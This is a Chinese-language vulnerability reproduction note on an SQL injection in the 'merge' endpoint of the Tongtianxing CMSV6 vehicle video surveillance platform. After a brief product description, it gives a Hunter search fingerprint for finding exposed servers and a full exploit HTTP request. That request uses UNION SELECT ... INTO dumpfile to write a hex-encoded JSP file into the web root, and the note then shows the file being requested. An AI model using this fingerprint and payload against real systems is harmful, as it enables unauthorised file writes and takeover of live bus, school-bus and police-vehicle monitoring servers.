# 通天星CMSV6车载视频监控平台 merge存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台merge存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/Afrkn5c6A6CUIImS/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-135980.png)

# 四、漏洞复现
```plain
POST /point_manage/merge HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 

id=1&name=9' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e74282248656c6c6f20576f726c642122293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/testqwe.jsp' FROM user_session a
WHERE '9 '='9 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```

![1719308744478-3dcb8622-37c6-4df6-b680-6efbdd362858.png](./img/Afrkn5c6A6CUIImS/1719308744478-3dcb8622-37c6-4df6-b680-6efbdd362858-321423.png)

```plain
/testqwe.jsp
```

![1719308766874-83e8ee62-5756-4956-a24c-8785c401dcba.png](./img/Afrkn5c6A6CUIImS/1719308766874-83e8ee62-5756-4956-a24c-8785c401dcba-983012.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lbwmh459c1s3w59c>